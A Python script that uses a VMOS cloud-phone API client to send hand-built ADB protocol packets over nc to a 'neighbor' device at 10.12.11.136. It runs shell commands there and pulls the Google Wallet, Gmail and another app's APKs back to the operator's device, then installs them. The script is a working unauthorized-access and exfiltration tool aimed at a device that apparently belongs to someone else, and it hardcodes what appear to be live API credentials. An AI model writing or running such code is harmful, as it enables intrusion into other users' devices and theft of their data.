#!/usr/bin/env python3
"""Clone APKs from Google Wallet neighbor (10.12.11.136) to our device."""
import asyncio, sys, struct, base64, re
sys.path.insert(0, '/home/debian/Downloads/vmos-titan-unified')
from vmos_titan.core.vmos_cloud_api import VMOSCloudClient

PAD = 'APP6476KYH9KMLU5'
TARGET = '10.12.11.136'
OUR_IP = '10.12.11.186'
D = 3.5

def _cs(d): return sum(d) & 0xFFFFFFFF
def _mg(c): return struct.unpack("<I", c)[0] ^ 0xFFFFFFFF
def _pkt(c, a0, a1, d=b""):
    return struct.pack("<4sIIIII", c, a0, a1, len(d), _cs(d), _mg(c)) + d
def cnxn(): return _pkt(b"CNXN", 0x01000001, 256*1024, b"host::\x00")
def opn(lid, svc): return _pkt(b"OPEN", lid, 0, svc.encode() + b"\x00")

async def run():
    c = VMOSCloudClient(ak='BPWNWxfXMQsjsREyzIOXmCtndRZO8iVi', sk='Q2SgcSwEfuwoedY0cijp6Mce', base_url='https://api.vmoscloud.com')

    async def cmd(sh, t=30):
        r = await c.sync_cmd(PAD, sh, timeout_sec=t)
        d = r.get('data', [])
        return (d[0].get('errorMsg', '') if d else '') or ''

    async def fire(sh):
        try: await c.async_adb_cmd([PAD], sh)
        except: pass
        await asyncio.sleep(D)

    async def nb_cmd(shell_cmd, timeout=12):
        """Execute cmd on neighbor via ADB relay, read text output"""
        pkt_open = opn(1, f"shell:{shell_cmd}")
        open_b64 = base64.b64encode(pkt_open).decode()
        await cmd(f"echo -n '{open_b64}' | base64 -d > /data/local/tmp/nb_open", t=15)
        await asyncio.sleep(D)
        relay = f'(cat /sdcard/.cnxn_main; sleep 0.3; cat /data/local/tmp/nb_open; sleep {timeout}) | timeout {timeout+3} nc {TARGET} 5555 2>/dev/null | strings -n 2 | grep -v -E "^(CNXN|OKAY|WRTE|CLSE|OPEN|host::|device::)" > /data/local/tmp/nb_out 2>/dev/null'
        await fire(relay)
        await asyncio.sleep(timeout + 2)
        return await cmd('cat /data/local/tmp/nb_out 2>/dev/null')

    async def nb_fire(shell_cmd, timeout=5):
        """Fire-and-forget cmd on neighbor - don't wait for output"""
        pkt_open = opn(1, f"shell:{shell_cmd}")
        open_b64 = base64.b64encode(pkt_open).decode()
        await cmd(f"echo -n '{open_b64}' | base64 -d > /data/local/tmp/nb_open", t=15)
        await asyncio.sleep(D)
        # Run relay in background on our device
        relay = f'(cat /sdcard/.cnxn_main; sleep 0.3; cat /data/local/tmp/nb_open; sleep {timeout}) | timeout {timeout+3} nc {TARGET} 5555 > /dev/null 2>&1 &'
        await fire(relay)

    # ============================================================
    # PHASE 1: Get ALL APK paths per package
    # ============================================================
    print('=== PHASE 1: Get APK paths from neighbor ===')
    
    packages = [
        'com.google.android.apps.walletnfcrel',
        'com.google.android.gm',
        'net.avianlabs.app'
    ]
    
    all_splits = {}
    for pkg in packages:
        out = await nb_cmd(f'pm path {pkg} 2>/dev/null; echo ENDPKG', timeout=8)
        splits = []
        for line in (out or '').split('\n'):
            line = line.strip()
            if line.startswith('package:'):
                path = line.replace('package:', '').strip()
                if path and path.endswith('.apk'):
                    splits.append(path)
        all_splits[pkg] = splits
        print(f'  {pkg}: {len(splits)} splits')
        for s in splits:
            print(f'    {s.split("/")[-1]}')
    
    # ============================================================
    # PHASE 2: Transfer each APK via nc (nohup to survive ADB disconnect)
    # ============================================================
    print('\n=== PHASE 2: Transfer APKs ===')
    
    PORT = 19860
    transfer_map = {}  # pkg -> {filename: local_path}
    
    for pkg, splits in all_splits.items():
        if not splits:
            print(f'  SKIP {pkg}: no APKs')
            continue
        
        safe_pkg = pkg.replace('.', '_')
        transfer_map[pkg] = {}
        
        for apk_path in splits:
            fname = apk_path.split('/')[-1]
            local_path = f'/data/local/tmp/{safe_pkg}_{fname}'
            
            print(f'\n  --- {pkg} / {fname} ---')
            
            # Get file size from neighbor
            out = await nb_cmd(f'wc -c < {apk_path}', timeout=6)
            size_str = ''.join(c for c in (out or '').split('\n')[0] if c.isdigit())
            expected_size = int(size_str) if size_str else 0
            print(f'    Expected: {expected_size} bytes')
            
            # Clean and start nc listener on our device
            await fire(f'rm -f {local_path}; nc -l -p {PORT} > {local_path} &')
            print(f'    Listener port {PORT}')
            await asyncio.sleep(1)
            
            # Trigger nc send from neighbor with nohup (persists after ADB relay closes)
            send_cmd = f'nohup sh -c "cat {apk_path} | nc -w 5 {OUR_IP} {PORT}" >/dev/null 2>&1 &'
            await nb_fire(send_cmd, timeout=3)
            print(f'    Send triggered')
            
            # Poll for transfer completion
            ok = False
            for poll in range(15):
                await asyncio.sleep(3)
                size_out = await cmd(f'stat -c %s {local_path} 2>/dev/null || echo 0')
                cur_size = int(''.join(c for c in (size_out or '').strip() if c.isdigit()) or '0')
                if expected_size > 0 and cur_size >= expected_size:
                    print(f'    COMPLETE: {cur_size} bytes')
                    transfer_map[pkg][fname] = local_path
                    ok = True
                    break
                elif cur_size > 0 and poll > 0:
                    # Check if size stopped growing
                    await asyncio.sleep(2)
                    size_out2 = await cmd(f'stat -c %s {local_path} 2>/dev/null || echo 0')
                    cur_size2 = int(''.join(c for c in (size_out2 or '').strip() if c.isdigit()) or '0')
                    if cur_size2 == cur_size and cur_size2 > 100:
                        print(f'    DONE: {cur_size2} bytes (expected {expected_size})')
                        transfer_map[pkg][fname] = local_path
                        ok = True
                        break
                    print(f'    Progress: {cur_size}/{expected_size}')
            
            if not ok:
                size_out = await cmd(f'stat -c %s {local_path} 2>/dev/null || echo 0')
                cur = int(''.join(c for c in (size_out or '').strip() if c.isdigit()) or '0')
                if cur > 0:
                    print(f'    PARTIAL: {cur}/{expected_size} bytes')
                    transfer_map[pkg][fname] = local_path
                else:
                    print(f'    FAILED: no data')
            
            PORT += 1
    
    # ============================================================
    # PHASE 3: Install using pm install-create/write/commit for splits
    # ============================================================
    print('\n=== PHASE 3: Install APKs ===')
    
    for pkg, files in transfer_map.items():
        if not files:
            continue
        
        print(f'\n  Installing {pkg} ({len(files)} files)...')
        
        if len(files) == 1:
            local_path = list(files.values())[0]
            out = await cmd(f'pm install -r -d -g {local_path} 2>&1')
            if 'Success' not in (out or ''):
                out = await cmd(f'pm install -r -d -g --bypass-low-target-sdk-block {local_path} 2>&1')
            print(f'    Result: {out.strip() if out else "unknown"}')
        else:
            # Compute total size
            total_size = 0
            file_sizes = {}
            for fname, local_path in files.items():
                out = await cmd(f'stat -c %s {local_path} 2>/dev/null')
                sz = int(''.join(c for c in (out or '') if c.isdigit()) or '0')
                file_sizes[fname] = sz
                total_size += sz
                await asyncio.sleep(D)
            
            print(f'    Total size: {total_size}')
            
            # Create session
            out = await cmd(f'pm install-create -r -d -g -S {total_size} 2>&1')
            print(f'    Create: {out.strip() if out else "??"}')
            await asyncio.sleep(D)
            
            # Parse session ID [1234567]
            m = re.search(r'\[(\d+)\]', out or '')
            if not m:
                print(f'    FAILED: no session ID')
                continue
            
            session_id = m.group(1)
            print(f'    Session: {session_id}')
            
            # Write each split
            for idx, (fname, local_path) in enumerate(files.items()):
                sz = file_sizes.get(fname, 0)
                split_name = fname.replace('.apk', '')
                out = await cmd(f'pm install-write -S {sz} {session_id} {split_name} {local_path} 2>&1')
                print(f'    Write [{idx}] {fname}: {out.strip() if out else "ok"}')
                await asyncio.sleep(D)
            
            # Commit
            out = await cmd(f'pm install-commit {session_id} 2>&1')
            print(f'    Commit: {out.strip() if out else "??"}')
        
        await asyncio.sleep(D)
    
    # ============================================================
    # PHASE 4: Verify
    # ============================================================
    print('\n=== PHASE 4: Verification ===')
    out = await cmd('pm list packages | grep -E "walletnfcrel|avianlabs|com.google.android.gm$" | sort')
    print(f'Target packages:\n{out}')
    
    out = await cmd('pm list packages -3 | sort')
    print(f'\nAll 3rd party:\n{out}')

asyncio.run(run())
